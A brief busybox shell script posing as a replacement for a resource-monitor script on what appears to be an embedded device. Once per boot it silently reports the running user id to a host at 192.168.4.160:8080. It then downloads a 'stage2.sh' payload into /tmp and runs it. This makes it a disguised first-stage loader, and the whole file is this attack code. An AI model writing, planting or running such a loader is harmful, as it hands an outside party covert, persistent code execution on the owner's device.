#!/bin/sh
# res_monitor.sh replacement: one shot per boot, then a marker so repeats are free.
B=http://192.168.4.160:8080
[ -e /tmp/fss_resmon_once ] && exit 0
/bin/busybox wget -q -O /dev/null "$B/fss-ran?uid=$(/bin/busybox id -u 2>/dev/null)&via=resmon" 2>/dev/null
touch /tmp/fss_resmon_once
/bin/busybox wget -q -O /tmp/fss_s2.sh "$B/fss/stage2.sh" 2>/dev/null && sh /tmp/fss_s2.sh
